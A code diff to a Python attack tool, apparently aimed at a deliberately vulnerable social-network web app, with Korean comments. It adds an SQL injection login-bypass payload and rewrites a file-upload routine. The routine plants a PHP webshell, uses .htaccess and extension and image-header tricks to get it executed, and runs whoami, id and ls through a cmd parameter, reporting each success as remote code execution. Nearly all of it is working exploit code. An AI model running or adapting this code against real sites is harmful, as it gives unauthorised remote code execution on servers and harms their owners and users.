@@ -185,6 +185,7 @@ class AdvancedVulnerableSNSAttacker:
             ("admin", '" or 1=1 --', 'Double quote numeric OR'),
             ('admin" or "a"="a" --', 'anything', 'Username field injection'),
             ('admin" --', 'anything', 'Comment out password'),
+            ("admin", "' or '1'='1", 'Password field injection')
         ]
         
         # 고급 WAF 우회 페이로드
@@ -502,70 +503,112 @@ php_flag engine on
                     
                     # 실행 테스트
                     actual_filename = filename.replace('\x00', '').replace('%00', '')
+
+                    # htaccess는 직접 실행할 수 없으므로 PHP 파일 업로드
                     if actual_filename == '.htaccess':
-                        # htaccess 업로드 후 JPG 파일로 쉘 실행 테스트
-                        test_filename = 'test.jpg'
+                        # htaccess 업로드 후 PHP5 파일로 쉘 실행 테스트
+                        test_filename = 'shell.php5'
                         test_content = b'<?php system("whoami"); ?>'
-                        files = {'file': (test_filename, test_content, 'image/jpeg')}
-                        self.session.post(upload_url, files=files)
-                        actual_filename = test_filename
-                    
-                    print(f"\n[*] Testing execution...")
-                    commands = ['whoami', 'id', 'pwd', 'ls -la']
-                    
-                    for cmd in commands:
-                        try:
-                            params = {'name': actual_filename, 'cmd': cmd}
-                            cmd_response = self.session.get(file_url, params=params, timeout=10)
+                        files = {'file': (test_filename, test_content, 'application/x-php')}
+
+                        upload_response = self.session.post(upload_url, files=files)
+                        if 'success' in upload_response.text.lower():
+                            actual_filename = test_filename
+                            print(f"[+] Additional shell uploaded: {test_filename}")
+
+                    # 모든 PHP 확장자 파일에 대해 실행 테스트
+                    if any(ext in actual_filename.lower() for ext in ['.php', '.php3', '.php4', '.php5', '.phtml', '.phar']):
+                        print(f"\n[*] Testing execution of: {actual_filename}")
+                        commands = ['whoami', 'id', 'pwd', 'ls -la']
+                        
+                        for cmd in commands:
+                            try:
+                                params = {'name': actual_filename, 'cmd': cmd}
+                                cmd_response = self.session.get(file_url, params=params, timeout=10)
+                                
+                                # 응답 전체에서 명령 실행 결과 찾기
+                                response_text = cmd_response.text
+                                
+                                # 성공 조건을 더 넓게
+                                if any(indicator in response_text for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=', 'gid=', '/', 'home']):
+                                    print(f"\n[+] SUCCESS! Command executed: {cmd}")
+                                    
+                                    # BeautifulSoup으로 정확한 출력 추출 시도
+                                    soup = BeautifulSoup(response_text, 'html.parser')
+                                    content_div = soup.find('div', class_='file-content')
+                                    
+                                    if content_div:
+                                        output = content_div.get_text(strip=True)
+                                    else:
+                                        # div가 없으면 전체 텍스트에서 추출
+                                        output = response_text.strip()
+                                    
+                                    print(f"    Output preview: {output[:100]}...")
+                                    
+                                    success_count += 1
+                                    successful_shells.append(actual_filename)
+                                    self.uploaded_webshell = actual_filename
+                                    
+                                    vuln_info = {
+                                        'upload_url': upload_url,
+                                        'filename': actual_filename,  # 실제 실행된 파일명
+                                        'actual_filename': actual_filename,
+                                        'bypass_technique': description + (f" (via .htaccess)" if filename == '.htaccess' else ""),
+                                        'command': cmd,
+                                        'output': output[:200],
+                                        'access_url': f"{file_url}?name={actual_filename}&cmd={cmd}",
+                                        'impact': 'CRITICAL - Remote Code Execution via advanced file upload bypass',
+                                        'cvss_score': 10.0
+                                    }
+                                    self.vulnerabilities['file_upload'].append(vuln_info)
+                                    
+                                    self.log_event(
+                                        'FILE_UPLOAD_RCE_ADVANCED',
+                                        f'Successfully uploaded and executed webshell using: {description}',
+                                        'CRITICAL',
+                                        {
+                                            'filename': filename if filename != '.htaccess' else f'.htaccess -> {actual_filename}',
+                                            'bypass_method': description,
+                                            'variant': variant,
+                                            'test_command': cmd,
+                                            'output': output[:100]
+                                        }
+                                    )
+                                            
+                                    break  # 성공했으므로 다음 기법으로
+                                            
+                            except Exception as e:
+                                print(f"[-] Execution test error: {str(e)[:50]}")
+                                continue
+                        
+                    # PHP 파일이 아닌 경우 (JPG with PHP code 등)
+                    elif any(ext in actual_filename.lower() for ext in ['.jpg', '.jpeg', '.gif', '.png']) and variant == 'with_image_header':
+                        print(f"[*] Testing image file with PHP code: {actual_filename}")
+                        params = {'name': actual_filename, 'cmd': 'whoami'}
+                        cmd_response = self.session.get(file_url, params=params, timeout=10)
+                        
+                        if any(indicator in cmd_response.text for indicator in ['www-data', 'apache', 'nginx', 'root', 'uid=']):
+                            print(f"[+] Image file executed as PHP!")
+                            success_count += 1
+                            successful_shells.append(actual_filename)
                             
                             soup = BeautifulSoup(cmd_response.text, 'html.parser')
                             content_div = soup.find('div', class_='file-content')
+                            output = content_div.get_text(strip=True) if content_div else cmd_response.text.strip()
                             
-                            if content_div:
-                                output = content_div.get_text(strip=True)
-                                
-                                # PHP 코드가 실행되었는지 확인
-                                if output and '<?php' not in output and len(output) < 500:
-                                    if any(indicator in output for indicator in ['www-data', 'apache', 'root', 'uid=', '/']):
-                                        print(f"\n[+] SUCCESS! Command executed: {cmd}")
-                                        print(f"    Output: {output[:100]}...")
-                                        
-                                        success_count += 1
-                                        successful_shells.append(actual_filename)
-                                        self.uploaded_webshell = actual_filename
-                                        
-                                        vuln_info = {
-                                            'upload_url': upload_url,
-                                            'filename': filename,
-                                            'actual_filename': actual_filename,
-                                            'bypass_technique': description,
-                                            'command': cmd,
-                                            'output': output[:200],
-                                            'access_url': f"{file_url}?name={actual_filename}&cmd={cmd}",
-                                            'impact': 'CRITICAL - Remote Code Execution via advanced file upload bypass',
-                                            'cvss_score': 10.0
-                                        }
-                                        self.vulnerabilities['file_upload'].append(vuln_info)
-                                        
-                                        self.log_event(
-                                            'FILE_UPLOAD_RCE_ADVANCED',
-                                            f'Successfully uploaded and executed webshell using: {description}',
-                                            'CRITICAL',
-                                            {
-                                                'filename': filename,
-                                                'bypass_method': description,
-                                                'variant': variant,
-                                                'test_command': cmd,
-                                                'output': output[:100]
-                                            }
-                                        )
-                                        
-                                        break  # 성공했으므로 다음 기법으로
-                                        
-                        except Exception as e:
-                            print(f"[-] Execution test error: {str(e)[:50]}")
-                            continue
-                    
+                            vuln_info = {
+                                'upload_url': upload_url,
+                                'filename': actual_filename,
+                                'actual_filename': actual_filename,
+                                'bypass_technique': description,
+                                'command': 'whoami',
+                                'output': output[:200],
+                                'access_url': f"{file_url}?name={actual_filename}&cmd=whoami",
+                                'impact': 'CRITICAL - Image file executed as PHP code',
+                                'cvss_score': 10.0
+                            }
+                            self.vulnerabilities['file_upload'].append(vuln_info)
+                        
                 else:
                     print(f"[-] Upload failed or blocked")
                     
